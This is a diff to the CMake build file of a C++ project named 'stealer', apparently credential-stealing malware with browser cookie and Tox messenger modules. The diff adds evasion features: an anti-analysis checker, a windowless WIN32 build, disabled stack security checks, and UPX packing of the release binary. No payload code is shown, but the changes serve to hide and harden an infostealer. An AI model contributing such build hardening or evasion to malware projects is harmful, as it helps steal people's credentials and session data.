@@ -2,12 +2,27 @@ cmake_minimum_required(VERSION 3.28)
 project(stealer)
 
 set(CMAKE_CXX_STANDARD 20)
-#set(CMAKE_EXE_LINKER_FLAGS "-static")
+
+if(CMAKE_BUILD_TYPE STREQUAL "Release")
+    add_compile_options(
+            /O1
+            /GL
+            /Oy
+            /Gw
+            /GS-
+    )
+    add_link_options(
+            /LTCG
+            /OPT:REF
+            /OPT:ICF
+            /COMPACT
+    )
+endif()
 
 include_directories(include)
 link_directories(include)
 
-add_executable(stealer src/main.cpp
+add_executable(stealer WIN32 src/main.cpp
         src/stealer/Stealer.cpp
         src/stealer/Stealer.h
         src/stealer/StealerModule.h
@@ -111,6 +126,8 @@ add_executable(stealer src/main.cpp
         src/stealer/impl/browsers/firefox/impl/FCookies.h
         src/stealer/impl/messengers/impl/Tox.cpp
         src/stealer/impl/messengers/impl/Tox.h
+        src/antianalysis/AntiAnalysisChecker.cpp
+        src/antianalysis/AntiAnalysisChecker.h
 )
 
 target_link_libraries(stealer
@@ -121,6 +138,13 @@ target_link_libraries(stealer
 )
 
 if(CMAKE_BUILD_TYPE STREQUAL "Release")
+    add_custom_command(
+            TARGET stealer
+            POST_BUILD
+            COMMAND ${CMAKE_CURRENT_SOURCE_DIR}\\libraries\\upx.exe --best --lzma $<TARGET_FILE:stealer>
+            COMMENT "Packing stealer with UPX"
+    )
+
     add_definitions(-DDEV=false)
 else()
     add_definitions(-DDEV=true)
